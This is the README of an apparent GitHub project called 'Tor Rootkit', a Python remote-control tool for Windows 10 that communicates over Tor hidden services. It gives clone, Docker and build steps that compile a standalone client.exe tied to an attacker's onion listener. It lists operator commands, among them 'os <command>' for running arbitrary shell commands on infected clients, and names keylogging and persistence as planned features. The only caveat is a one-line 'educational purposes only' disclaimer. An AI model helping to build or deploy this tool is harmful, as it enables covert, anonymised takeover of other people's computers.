# Tor Rootkit
[![Docker Image CI](https://github.com/emcruise/TorRootkit/actions/workflows/docker-image.yml/badge.svg)](https://github.com/emcruise/TorRootkit/actions/workflows/docker-image.yml)
![Standalone Compilation](https://github.com/emcruise/TorRootkit/workflows/Standalone%20Compilation/badge.svg)

A Python 3 standalone Windows 10 Rootkit. The networking works over tor hidden services.


## Installation
- Clone with git:
```bash
git clone https://github.com/emcruise/TorRootkit.git
```

- Change directory to the repository:
```bash
cd ./TorRootkit
```

### Listener
The listener is designed to run on linux.

1. Build docker container:
```bash
sudo docker build -t listener .
```

2. Run docker container:
```bash
sudo docker run -it listener
```

### Client
The client is designed to run on Windows 10.

#### Prerequisites
- [Python3](https://www.python.org/)
- [Pip3](https://pypi.org/project/pip/)
- Add Python3 and Pip3 to PATH

1. Change directory to client:
```bash
cd .\client
```

2. Install all pip3 dependencies:
```bash
pip3 install -r requirements.txt
```
3. Build executable from build.py:
- downloads [Tor Expert Bundle](https://www.torproject.org/download/tor/)
- bundles python3 interpreter and tor expert bundle into 1 standalone .exe file
```bash
python build.py <listener-onion-address> <listener-onion-port>
```

3. Execute the bundled client:
```bash
.\dist\client.exe
```

## Disclaimer
Use for educational purposes only.

## Features
- Standalone executable, including python interpreter and tor expert bundle (~13MB)
- the whole communication works over tor hidden services which guarantees some degree of anonymity
- Listener can handle multiple clients
- Client auto reconnects

## Upcoming Features
- [] cross-plattform compatibility
- [] Up- and Download functionality
- [] Screenshots
- [] Keylogging
- [] Persistence

## Listener Shell Usage
### Listener Server Shell
| Command | Explanation |
| ------- | ----------- |
| `help`  | Shows the help menu |
| `^C` or `exit` | Exits the shell |
| `list` | lists all connected clients with their according index |
| `select <index>` | start shell with client |

### Client Shell
| Command | Explanation |
| ------- | ----------- |
| `help`  | Shows the help menu |
| `^C` or `exit` | Exits the shell and returns to listener shell |
| `os <command>` | Executes a command in the clients shell and returns the output |

## Contribution
All contributions are appreciated.

## Credits
- [Tor](https://www.torproject.org/)
- [PyInstaller](https://www.pyinstaller.org/)
- [Colorama Font](https://pypi.org/project/colorama/)
- [PySocks](https://pypi.org/project/PySocks/)
- [Stem](https://stem.torproject.org/)

